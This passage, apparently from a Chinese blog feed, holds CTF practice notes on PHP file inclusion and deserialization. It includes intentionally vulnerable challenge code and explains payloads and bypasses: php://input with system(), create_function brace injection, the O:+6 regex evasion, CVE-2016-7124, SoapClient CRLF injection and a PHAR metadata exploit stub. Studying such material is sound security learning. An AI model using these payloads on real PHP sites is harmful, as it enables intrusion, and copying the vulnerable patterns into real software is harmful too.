href="#str-replace-过滤替换" class="headerlink" title="str_replace 过滤替换"></a>str_replace 过滤替换</h2><p>使用大写<code>PHP://</code>替换小写或使用<code>phpphp:////</code>拼接（双写绕过但源码有循环防御）。</p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p><code>php://input</code> 是一个只读流，用于获取原始 POST 数据。它可以用于接收 JSON 或 XML 格式的数据，而不需要解析表单数据。</p><p>通过 <code>php://input</code> 获得 post 数据然后 <code>include()</code> 执行该数据，可以执行想要的恶意代码。</p><p>postman 中 post 模式，headers 选择 <code>Content-Type</code> 为 <code>application/x-www-form-urlencoded</code>，body 中选择 raw，输入<code>system(&#39;ls)</code>。</p><p>获取目录文件-&gt;输出文件</p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><h3 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化练习</title>
      <link href="/2025/08/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/"/>
      <url>/2025/08/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>如何把其他文件输出 highlight_file(‘flag.php’);</p><p>最简单的反序列化</p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>最简单的反序列化</p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mylogin</span></span>&#123;</span><br><span class="line">   <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">   <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;user==<span class="string">&quot;daydream&quot;</span> <span class="keyword">and</span> <span class="variable language_">$this</span>-&gt;pass==<span class="string">&quot;ok&quot;</span>)&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;param&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">login</span>())</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>urlencode</p><ol><li>在收到请求时，PHP 内部会 <strong>自动对 Cookie 做一次百分号解码（percent-decode）</strong>，再把结果填进 <code>$_COOKIE</code> 超全局，所以脚本里看到的已经是“还原好”的字符串。</li></ol></li><li><p>PHP 对 <code>$_GET</code> &#x2F; <code>$_POST</code> 也会先做同样的解码（只是 <code>+</code> 在 query string 会变空格）；保持行为一致更易理解。</p></li></ol><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;key)();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;       <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="variable language_">$this</span>-&gt;action;</span><br><span class="line">            <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]);</span><br></pre></td></tr></table></figure><ol><li><p><code>creat_function()</code>: <code>create_function(string $args, string $code): string</code>. 它内部会 <code>eval(&quot;function ($args) &#123; $code &#125;&quot;)</code> —— <strong>在创建时就执行 <code>eval</code></strong>。</p><ol><li>将<code>$code</code>的首字符设为<code>&#125;</code>，这是经典的 <strong><code>create_function</code> 注入技巧</strong>：<ul><li><code>create_function(&#39;&#39;, &#39;…代码…&#39;)</code> 会拼成：<code>function () &#123; …代码… &#125;</code></li><li>你把 <code>code</code> 设为 <code>&quot;&#125;...;//&quot;</code>，<strong>先闭合</strong>函数体，然后插入任意 PHP 语句，最后用注释吞掉尾巴。</li></ul></li></ol></li><li><p>PHP 7+ 允许对“数组型 callable（<code>[$obj,&#39;method&#39;]</code>）”直接用 <code>()</code> 调用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hi</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello, <span class="subst">$name</span>\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span>   = <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="variable">$cb</span>  = [<span class="variable">$d</span>, <span class="string">&#x27;hi&#x27;</span>];       <span class="comment">// 数组型 callable</span></span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;Peter&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1) 传统</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$cb</span>, <span class="variable">$arg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2) PHP 7+ 直接调用</span></span><br><span class="line"><span class="variable">$cb</span>(<span class="variable">$arg</span>);               <span class="comment">// 也可写 ($cb)($arg);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3) 本质等同于</span></span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="title function_ invoke__">hi</span>(<span class="variable">$arg</span>);            <span class="comment">// 直接方法调用</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;construct&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;destruct&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wakeup&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;index.php&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Are you daydreaming?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>序列格式化过滤绕过：<ol><li>在<code>preg_match(&#39;/[oc]:\d+:/i&#39;,$cmd</code>中，在数字前面加上<code>+</code>，<code>O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>.</li><li>在 PHP 的序列化语法 里，所有用数字表示长度或数量的字段其实都被当成 “C-风格整数” 来解析——也就是说，前面出现一个 + 或 - 号，unserialize() 仍会把它正确地转换成整数值。“+” 不会改变实际长度校验。</li></ol></li><li>CVE-2016-7124 漏洞：<ol><li>PHP 5.6.0 – 5.6.24 和 7.0.0 – 7.0.9 在执行 unserialize() 时，如果反序列化过程 途中失败（典型场景：属性数量与真实不符、循环引用解析出错等），就会提早返回而 不再调用 <strong>wakeup()——但此时对象已经被创建进内存并最终会被析构，从而触发</strong>destruct()。依赖 __wakeup() 做安全检查、权限校验、属性清理的应用会被绕过，导致 任意魔术方法调用、远程代码执行或拒绝服务。</li></ol></li></ol><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$comm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$com</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;comm = <span class="variable">$com</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;comm;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;comm);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;%&quot;</span>,<span class="string">&quot;daydream&quot;</span>,<span class="variable">$param</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$param</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$param</span>);</span><br></pre></td></tr></table></figure><ol><li><code>private</code>属性：<ol><li>特别的， 当一个变量为私有变量时， 序列化之后会在变量名的头部添加\00 类名\00， 由于\00 不可见， 显示在页面上就是类名+变量名， 但是该名称的长度依然计算两个\00， 所以在实际场景中，需要注意长度和名称是否匹配。</li><li>如果变量为 protected， 会在变量名的头部添加\00*\00。</li><li>使用 urlencode()可以引入\00，或者使用 burpsuite 的<code>URL编码</code>功能（%00）（未验证）。</li></ol></li></ol><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">you</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$body</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pro</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$project</span>=<span class="variable language_">$this</span>-&gt;pro;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;body-&gt;<span class="variable">$project</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func</span> == <span class="string">&#x27;yourname&#x27;</span> <span class="keyword">and</span> <span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;myname&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><ol><li><code>__call($func, $args)</code> 魔术方法：<ol><li>当调用一个不可访问的对象方法时，PHP 会自动调用 <code>__call()</code> 方法。</li><li><code>__call()</code> 接受两个参数：方法名和参数数组。</li><li>例如：<code>$obj-&gt;method($arg1, $arg2)</code> 会触发 <code>$obj-&gt;__call(&#39;method&#39;, [$arg1, $arg2])</code></li></ol></li></ol><h2 id="8-字符串缩短-增长逃逸"><a href="#8-字符串缩短-增长逃逸" class="headerlink" title="8 字符串缩短&#x2F;增长逃逸"></a>8 字符串缩短&#x2F;增长逃逸</h2><p>为什么不直接用</p><blockquote><p><code>var $pass=&#39;escaping&#39;;</code></p></blockquote><p>F12 控制台可见</p><h2 id="9-嵌套构造"><a href="#9-嵌套构造" class="headerlink" title="9 嵌套构造"></a>9 嵌套构造</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>确定<code>modifier-&gt;var</code>需要为<code>flag.php</code>-&gt;通过<code>__invoke()</code>-&gt;<code>__get()</code>方法调用-&gt;<code>to_string()</code>-&gt;<code>__wakeup()</code></p><h2 id="10-SOAP"><a href="#10-SOAP" class="headerlink" title="10 SOAP"></a>10 SOAP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]);</span><br><span class="line"><span class="variable">$c</span> -&gt; <span class="title function_ invoke__">daydream</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">In this topic,it is of course possible to pass parameters directly to flag.php, but it is not recommended to use this method to learn SOAP.</span></span><br><span class="line"><span class="comment">flag.php</span></span><br><span class="line"><span class="comment">$flag=&quot;*&quot;;</span></span><br><span class="line"><span class="comment">$user=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span></span><br><span class="line"><span class="comment">$pass = $_POST[&#x27;pass&#x27;];</span></span><br><span class="line"><span class="comment">if(isset($pass) and isset($user))&#123;</span></span><br><span class="line"><span class="comment">    if($pass==&#x27;password&#x27; and $user==&#x27;admin&#x27;)&#123;</span></span><br><span class="line"><span class="comment">        file_put_contents(&#x27;flag.txt&#x27;,$flag);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>基础的SOAP练习，通过反序列化一个内置的类<code>SoapClient</code>实现攻击。调用本地不存在的方法时，SoapClient 会将 HTTP 请求发送到您指定的位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, [</span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://example.com/service&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;myNamespace&#x27;</span></span><br><span class="line">]);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">daydream</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将发送</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/service</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml; charset=utf-8</span><br><span class="line"><span class="attribute">SOAPAction</span><span class="punctuation">: </span>&quot;myNamespace#daydream&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>其中有一个参数<code>user_agent</code>，可以通过<code>\r\n</code>截断从而增加参数。</p><p>值得注意的是，在高版本的 PHP 中，类<code>SoapClient</code>的<code>uri</code>是private的，而低版本是public的。这会导致不同版本序列化生成的字符串不同导致<code>Fatal error: Uncaught SoapFault exception: [Client] Error finding &quot;uri&quot; property</code>报错。</p><h2 id="11-PHAR"><a href="#11-PHAR" class="headerlink" title="11 PHAR"></a>11 PHAR</h2><p>php.ini中phar.readonly&#x3D;Off（若有分号则去掉）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞概念"><a href="#漏洞概念" class="headerlink" title="漏洞概念"></a>漏洞概念</h3><p><code>PHP</code> 的 <code>phar://</code> 流包装器允许使用普通文件函数（<code>md5_file、file_exists</code> 等）将文件作为 <code>PHAR</code> 存档打开。</p><p>当 <code>PHP</code> 打开 <code>PHAR</code> 时，它会自动取消序列化存档的元数据。</p><p>如果该元数据包含具有危险 <code>__destruct()</code> （或<code>__wakeup()</code>） 的类的对象，PHP 将执行该方法→代码执行&#x2F;标志泄漏。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol><li>创建一个包含恶意代码的 <code>PHAR</code> 文件。</li><li>通过 <code>phar://</code> 流包装器加载该文件。</li><li>触发 <code>__destruct()</code> 或 <code>__wakeup()</code> 方法，执行恶意代码。</li></ol><h3 id="构建恶意-PHAR"><a href="#构建恶意-PHAR" class="headerlink" title="构建恶意 PHAR"></a>构建恶意 PHAR</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar1.phar&quot;</span>);  <span class="comment">//删除任何旧的 PHAR</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar1.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//缓冲区更改</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php 